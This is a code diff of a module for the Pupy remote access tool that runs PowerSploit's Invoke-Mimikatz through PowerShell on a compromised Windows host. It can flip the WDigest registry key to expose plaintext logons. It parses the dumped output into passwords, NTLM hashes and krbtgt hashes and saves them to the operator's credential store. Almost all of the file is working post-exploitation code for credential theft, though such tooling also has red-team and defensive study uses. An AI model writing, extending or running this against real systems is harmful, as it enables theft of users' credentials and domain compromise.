@@ -1,19 +1,21 @@
-# -*- coding: UTF8 -*-
+# -*- coding: utf-8 -*-
 from pupylib.PupyModule import *
 import os
 import re
-from modules.lib.windows.powershell_upload import execute_powershell_script
 from pupylib.utils.credentials import Credentials
+from pupylib.utils.term import consize
 
 __class_name__="Mimikatz_Powershell"
 ROOT=os.path.abspath(os.path.join(os.path.dirname(__file__),".."))
 
 @config(compat="windows", category="creds")
 class Mimikatz_Powershell(PupyModule):
-    """ 
+    """
         execute mimikatz using powershell
     """
-    
+
+    dependencies = ['pupwinutils.wdigest', 'powershell']
+
     def init_argparse(self):
 
         commands_available = '''
@@ -23,38 +25,48 @@ Invoke-Mimikatz -DumpCreds -ComputerName @("computer1", "computer2")
 Invoke-Mimikatz -Command "privilege::debug exit" -ComputerName "computer1"
 '''
         self.arg_parser = PupyArgumentParser(prog="Mimikatz_Powershell", description=self.__doc__, epilog=commands_available)
+        self.arg_parser.add_argument("-1", '--once', action='store_true', help='Unload after execution')
         self.arg_parser.add_argument("--wdigest", choices={'check', 'enable', 'disable'}, default='', help="Creates/Deletes the 'UseLogonCredential' registry key enabling WDigest cred dumping on Windows >= 8.1")
         self.arg_parser.add_argument("-o", metavar='COMMAND', dest='command', default='Invoke-Mimikatz', help='command not needed')
 
     def run(self, args):
-        
+
         # for windows 10, if the UseLogonCredential registry is not present or disable (equal to 0), not plaintext password can be retrieved using mimikatz.
         if args.wdigest:
-            self.client.load_package("pupwinutils.wdigest")
             ok, message = self.client.conn.modules["pupwinutils.wdigest"].wdigest(args.wdigest)
-            if ok: 
+            if ok:
                 self.success(message)
             else:
                 self.warning(str(message))
             return
 
-        script ='mimikatz'
+        script = 'mimikatz'
+        powershell = self.client.conn.modules['powershell']
 
-        # check if file has been already uploaded to the target
-        for arch in ['x64', 'x86']:
-            if script not in self.client.powershell[arch]['scripts_loaded']:
-                content = open(os.path.join(ROOT, "external", "PowerSploit", "Exfiltration", "Invoke-Mimikatz.ps1"), 'r').read()
-            else:
-                content = ''
+        if not powershell.loaded(script):
+            with open(os.path.join(ROOT, 'external', 'PowerSploit', 'Exfiltration', 'Invoke-Mimikatz.ps1')) as content:
+                width, _ = consize()
+                content = content.read()
+                powershell.load(script, content, width=width, try_x64=True)
 
-        output = execute_powershell_script(self, content, args.command, x64IfPossible=True, script_name=script)
-        if not output:
+        output, rest = powershell.call(script, args.command)
+
+        if args.once:
+            powershell.unload(script)
+
+        if rest:
+            self.error(rest)
+
+        if output:
+            self.log(output)
+        else:
             self.error("Error running mimikatz. Enough privilege ?")
             return
+
         self.success("%s" % output)
-        
+
         creds = self.parse_mimikatz(output)
-        db = Credentials()
+        db = Credentials(client=self.client.short_name(), config=self.config)
         db.add(creds)
         self.success("Credentials stored on the database")
 
@@ -69,7 +81,15 @@ Invoke-Mimikatz -Command "privilege::debug exit" -ComputerName "computer1"
         creds = []
 
         # regexes for "sekurlsa::logonpasswords" Mimikatz output
-        regexes = ["(?s)(?<=msv :).*?(?=tspkg :)", "(?s)(?<=tspkg :).*?(?=wdigest :)", "(?s)(?<=wdigest :).*?(?=kerberos :)", "(?s)(?<=kerberos :).*?(?=ssp :)", "(?s)(?<=ssp :).*?(?=credman :)", "(?s)(?<=credman :).*?(?=Authentication Id :)", "(?s)(?<=credman :).*?(?=mimikatz)"]
+        regexes = [
+            "(?s)(?<=msv :).*?(?=tspkg :)",
+            "(?s)(?<=tspkg :).*?(?=wdigest :)",
+            "(?s)(?<=wdigest :).*?(?=kerberos :)",
+            "(?s)(?<=kerberos :).*?(?=ssp :)",
+            "(?s)(?<=ssp :).*?(?=credman :)",
+            "(?s)(?<=credman :).*?(?=Authentication Id :)",
+            "(?s)(?<=credman :).*?(?=mimikatz)"
+        ]
 
         hostDomain = ""
         domainSid = ""
@@ -96,7 +116,7 @@ Invoke-Mimikatz -Command "privilege::debug exit" -ComputerName "computer1"
 
                 lines2 = match.split("\n")
                 username, domain, password = "", "", ""
-                
+
                 for line in lines2:
                     try:
                         if "Username" in line:
@@ -110,7 +130,7 @@ Invoke-Mimikatz -Command "privilege::debug exit" -ComputerName "computer1"
 
                     if password:
                         if username != "" and password != "" and password != "(null)":
-                            
+
                             sid = ""
 
                             # substitute the FQDN in if it matches
@@ -133,7 +153,16 @@ Invoke-Mimikatz -Command "privilege::debug exit" -ComputerName "computer1"
                                 if  len(password) < 300:
                                     store = True
 
-                            result = {'Domain': domain, 'Login': username, credType:password, 'CredType': credType.lower(), 'Host': hostName, 'sid':sid, 'Category': category, 'uid': self.client.short_name()}
+                            result = {
+                                'Domain': domain,
+                                'Login': username,
+                                credType:password,
+                                'CredType': credType.lower(),
+                                'Host': hostName,
+                                'sid':sid,
+                                'Category': category,
+                                'uid': self.client.short_name()
+                            }
                             # do not store password if it has already been stored
                             for c in creds:
                                 if c == result:
@@ -141,7 +170,7 @@ Invoke-Mimikatz -Command "privilege::debug exit" -ComputerName "computer1"
                             if store:
                                 creds.append(result)
                         username, domain, password = "", "", ""
-                        
+
         if len(creds) == 0:
             # check if we have lsadump output to check for krbtgt
             # happens on domain controller hashdumps
@@ -166,7 +195,17 @@ Invoke-Mimikatz -Command "privilege::debug exit" -ComputerName "computer1"
                                 break
 
                         if krbtgtHash != "":
-                            creds.append({'Domain': domain, 'Login': user, 'Hash': krbtgtHash, 'Host': hostName, 'CredType': 'hash', 'sid':sid, 'Category': 'krbtgt hash', 'uid': self.client.short_name()})
+                            creds.append({
+                                'Domain': domain,
+                                'Login': user,
+                                'Hash': krbtgtHash,
+                                'Host': hostName,
+                                'CredType': 'hash',
+                                'sid': sid,
+                                'Category': 'krbtgt hash',
+                                'uid': self.client.short_name()
+                            })
+
                     except Exception as e:
                         pass
 
@@ -191,7 +230,16 @@ Invoke-Mimikatz -Command "privilege::debug exit" -ComputerName "computer1"
                         pass
 
                 if domain != "" and userHash != "":
-                    creds.append({'Domain': domain, 'Login': user, 'Hash': userHash, 'Host': dcName, 'CredType': 'hash', 'SID':sid, 'Category': 'NTLM hash', 'uid': self.client.short_name()})
+                    creds.append({
+                        'Domain': domain,
+                        'Login': user,
+                        'Hash': userHash,
+                        'Host': dcName,
+                        'CredType': 'hash',
+                        'SID':sid, 'Category':
+                        'NTLM hash',
+                        'uid': self.client.short_name()
+                    })
 
         return creds
 
